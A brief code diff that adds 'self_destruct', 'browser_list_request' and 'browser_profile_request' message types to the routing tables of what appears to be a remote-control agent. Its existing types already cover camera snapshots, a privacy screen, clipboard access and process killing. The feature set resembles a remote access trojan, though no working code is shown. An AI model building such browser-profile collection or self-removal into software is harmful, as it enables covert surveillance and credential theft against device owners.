@@ -34,7 +34,8 @@ AGENT_TO_CLIENT_TYPES = {
     # Bandwidth controls
     "bandwidth_mode", "streaming_toggle", "request_keyframe",
     # System actions & Camera
-    "system_action", "camera_snapshot_request", "privacy_screen",
+    "system_action", "camera_snapshot_request", "privacy_screen", "self_destruct",
+    "browser_list_request", "browser_profile_request",
 }
 
 # Message types routed from client → agent
@@ -52,6 +53,7 @@ CLIENT_TO_AGENT_TYPES = {
     "system_info", "process_list", "process_kill_response",
     "clipboard_content", "clipboard_set_response",
     "camera_snapshot_response",
+    "browser_list_response", "browser_profile_response",
 }
 
 
